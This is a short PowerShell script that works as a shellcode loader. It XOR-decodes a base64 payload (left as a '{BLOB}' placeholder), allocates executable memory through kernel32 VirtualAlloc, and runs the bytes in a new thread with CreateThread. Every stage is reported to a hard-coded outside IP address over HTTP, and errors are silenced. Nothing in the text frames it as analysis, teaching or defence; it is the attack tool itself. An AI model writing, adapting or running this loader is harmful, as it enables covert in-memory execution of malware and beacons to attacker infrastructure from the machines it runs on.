$ErrorActionPreference='SilentlyContinue'
$B='http://104.234.26.225:8090/ping?m='
function cb($m){ try{ (New-Object Net.WebClient).DownloadString($B+$m)|Out-Null }catch{} }
cb ('start-lang-'+$ExecutionContext.SessionState.LanguageMode)
$ok=$false
try{
 Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class N{
 [DllImport(""kernel32"")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
 [DllImport(""kernel32"")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);
 [DllImport(""kernel32"")] public static extern uint WaitForSingleObject(IntPtr h,uint m);
}
"@
 $ok=$true; cb ('addtype-ok')
}catch{ cb ('addtype-err-'+$_.Exception.GetType().Name) }
if($ok){
 try{
  $k=[byte[]](156,144,102,193,24,188,28,91,236,128,206,205,2,146,72,220,224,98,104,20,207,77,137,251,216,106,177,53,74,174,229,74)
  $b=[Convert]::FromBase64String('{BLOB}')
  for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % $k.Length]}
  cb ('dec-ok-len-'+$b.Length)
  $p=[N]::VirtualAlloc(0,$b.Length,0x3000,0x40)
  cb ('alloc-'+$p)
  [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length)
  $t=[N]::CreateThread(0,0,$p,0,0,0)
  cb ('thread-'+$t)
  [N]::WaitForSingleObject($t,0xFFFFFFFF)
  cb 'after-wait'
 }catch{ cb ('run-err-'+$_.Exception.GetType().Name) }
}
